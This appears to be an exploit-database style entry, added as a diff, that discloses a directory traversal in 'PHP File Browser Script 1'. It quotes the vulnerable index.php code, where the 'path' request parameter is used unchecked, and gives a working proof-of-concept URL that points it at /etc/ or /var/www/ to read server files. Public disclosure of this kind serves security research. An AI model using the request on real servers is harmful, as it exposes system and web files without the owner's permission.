@@ -1,0 +1,34 @@
+# Exploit Title: PHP File Browser Script 1 - Directory Traversal
+# Dork: N/A
+# Date: 2018-09-03
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://www.hscripts.com/scripts/php/file-browser.php
+# Software Link:https://www.hscripts.com/scripts/php/downloads/file-browser-demo.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : The "index.php" is vulnerable to directory traversal.
+# An attacker can see and read all files known by the name
+
+# Vulnerable File: index.php
+<?php // line 45
+
+72  $script = basename(__FILE__); // the name of this script
+73  $path = !empty($_REQUEST['path']) ? $_REQUEST['path'] : "demo"; // the path the script should access
+74
+75  if($loc!=''){
+76  echo "<p id='bloc'><b>Browsing Location: </b><a href='index.php'><b>".ucfirst($loc1)."</b></a>
+77  <a href='$script?path=$rpath/$loc1/$loc2'><b>".ucfirst($locdem2)."</b></a>
+78  <a href=''><b>".ucfirst($locdem3)."</b></a></p>";}
+79  else{
+80    echo "<p id='bloc'><b>Browsing Location: </b><a href=''><b>Demo</b></a></p>";
+
+?> // line 151
+
+# PoC :
+
+https://Target/scripts/php/file-browser-demo/index.php?path=[DirectoryName]
+
+# You can write the known directory name instead of [DirectoryName].
+# Example: '/etc/' or '/var/www/'  
+# https://Target/scripts/php/file-browser-demo/index.php?path=/etc/
